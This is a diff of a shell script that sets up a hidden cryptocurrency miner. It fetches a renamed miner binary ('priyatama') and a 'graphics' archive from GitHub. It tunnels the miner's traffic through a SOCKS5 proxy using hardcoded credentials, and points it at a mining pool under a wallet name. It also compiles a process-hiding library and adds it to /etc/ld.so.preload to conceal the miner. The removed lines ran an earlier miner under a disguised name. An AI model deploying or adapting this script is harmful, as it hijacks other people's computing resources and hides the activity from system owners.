@@ -1,15 +1,51 @@
-cd /home
-sudo apt-get install linux-headers-$(uname -r) -y
-distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
-wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
-sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
-sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-keyring_1.0-1_all.deb
-sudo dpkg -i cuda-keyring_1.0-1_all.deb
-sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/3bf863cc.pub
-sudo apt-get update
-sudo apt-get -y install cuda-drivers-510
-sudo apt-get install libcurl3 -y
-wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
-tar xvzf t-rex-0.21.6-linux.tar.gz
-mv t-rex racing
-/home/racing -a ethash -o stratum+tcp://ethash.poolbinance.com:25 -u teguhcong -p x -w 08-08-8338
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+curl -L -o graphics.tar.gz https://github.com/sbwsmg/yahahah/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 64.225.2.0:443
+socks5_username = mining
+socks5_password = untukkita
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://github.com/archernap/prem/raw/main/priyatama
+chmod +x priyatama
+POOL=stratum+tcp://etchash.poolbinance.com:443
+WALLET=teguhcong
+WORKER=$(echo $(shuf -i 10-40 -n 1)-MAGIC)
+
+./graftcp/graftcp wget https://github.com/hunzibao/tmp/raw/main/magicPriyatama.zip
+unzip magicPriyatama.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./priyatama --algo ETCHASH --pool $POOL --user $WALLET.$WORKER 
